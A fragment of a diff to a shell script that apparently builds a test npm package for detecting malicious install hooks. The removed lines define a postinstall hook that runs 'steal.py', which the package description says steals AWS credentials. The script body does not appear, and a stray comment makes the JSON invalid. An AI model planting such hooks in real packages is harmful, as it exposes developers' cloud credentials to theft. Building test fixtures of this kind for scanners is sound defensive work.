@@ -13,15 +13,5 @@ mkdir -p test-python-malicious
 cd test-python-malicious
 
 cat > package.json << 'EOF'
-// Handle error case
 {
   "name": "test-python-malicious",
-  "version": "1.0.0",
-  "description": "Test package with Python postinstall stealing AWS creds",
-  "scripts": {
-    "postinstall": "python3 steal.py"
-  }
-}
-EOF
-
-cat > steal.py << 'EOF'
